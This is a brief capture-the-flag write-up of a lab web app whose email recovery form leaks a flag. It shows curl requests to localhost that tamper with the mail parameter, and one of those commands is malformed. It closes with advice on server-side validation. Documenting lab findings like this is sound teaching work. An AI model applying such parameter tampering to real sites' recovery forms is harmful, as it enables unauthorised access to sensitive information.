## Email Recovery Form Vulnerability

### Summary
A vulnerability was discovered in the email recovery form, allowing users to bypass intended restrictions and retrieve a flag by submitting arbitrary email addresses.

### Methodology
1. Inspected the network requests and found a prefilled recovery form:
         ```bash
         curl -X POST http://localhost:8080/index.php?page=recover \
                 --data-raw 'mail=webmaster@borntosec.com&Submit=Submit'
         ```
2. Modified the email address in the request to an arbitrary value:
         ```bash
         curl -X POST http://localhost:8080/index.php?page=recover&mail=whatever&Submit=Submit' | grep flag
         ```
3. The server responded with the flag, indicating lack of proper validation.

### Findings
- The form does not validate the submitted email address, allowing any value to be accepted.
- This exposes sensitive information and undermines the intended recovery process.

### Recommendation
- Implement strict server-side validation for email recovery forms.
- Ensure only authorized and valid email addresses are processed.
